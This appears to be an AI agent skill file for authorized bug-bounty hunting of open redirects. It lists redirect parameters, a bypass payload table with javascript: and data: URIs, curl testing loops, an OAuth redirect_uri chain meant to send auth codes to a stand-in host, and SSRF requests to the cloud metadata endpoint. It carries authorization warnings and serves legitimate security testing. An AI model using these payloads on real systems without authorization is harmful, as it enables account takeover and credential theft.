---
name: hunt-open-redirect
description: Hunt Open Redirect
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public
report_count: 28
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-OPEN-REDIRECT — Open Redirect

## Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.com
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

## Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

## Bypass Table

| Technique | Payload |
|-----------|---------|
| Basic | `https://redirect-test.example` |
| Protocol relative | `//redirect-test.example` |
| Backslash bypass | `/\\redirect-test.example` |
| At-sign confusion | `https://target.com@redirect-test.example` |
| Double slash | `//redirect-test.example/%2F..` |
| URL encoding | `%2Fredirect-test.example` |
| Null byte | `redirect-test.example%00target.com` |
| Whitespace | `redirect-test.example%09` or `%20` |
| JavaScript URI | `javascript:window.location='https://redirect-test.example'` |
| Data URI | `data:text/html,<script>window.location='https://redirect-test.example'</script>` |
| Subdomain | `https://target.com.redirect-test.example` |
| Fragment | `https://redirect-test.example#.target.com` |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover Redirect Parameters
```bash
# Extract all redirect candidates from crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Less common param names
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
```

### Phase 2 — Basic Test
```bash
COLLAB="https://redirect-test.example"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

### Phase 3 — Bypass Techniques
```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://redirect-test.example"
  "//redirect-test.example"
  "/\\redirect-test.example"
  "https://$TARGET@redirect-test.example"
  "https://redirect-test.example%23.$TARGET"
  "https://redirect-test.example%09"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P → $LOC"
done
```

### Phase 3b — DOM-based open redirect (client-side sink)
Server-side `Location:` grepping misses redirects that happen purely in JS. Source (`location.hash`/`location.search`/`document.referrer`) assigned to a navigation sink.
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
# Confirm in a browser (curl can't): open  https://$TARGET/page#https://redirect-test.example  (or ?url=...)
# Common shape:  var u=new URLSearchParams(location.search).get('url'); location=u;
```
(PortSwigger: DOM-based open redirection.)

### Phase 4 — OAuth Chain Test
```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.com/callback
# Attack: redirect_uri=https://target.com/redirect?url=https://redirect-test.example
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fredirect-test.example" 2>&1 | grep -i "location:"
```

### Phase 5 — Server-Side Redirect (SSRF escalation)
```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl -s "https://$TARGET/proxy?url=https://redirect-test.example/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

---

## Automation
```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p redirect-test.example

# nuclei
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# gf + qsreplace
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://redirect-test.example" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
```

---

## Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

## Validation

✅ Location header in response points to redirect-test.example (your controlled domain)
✅ Browser follows redirect to attacker-controlled page

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.

`redirect-test.example` is a reserved illustrative hostname, not a live callback service. For network proof use a domain explicitly controlled and approved for this assessment; never send tokens to a third-party domain. OAuth redirect behavior alone does not establish account takeover: verify client binding, PKCE, exact redirect policy and actual impact using test accounts. For SSRF chains use a controlled canary, not cloud metadata credentials or internal secret extraction. Rate severity from demonstrated scope/impact.
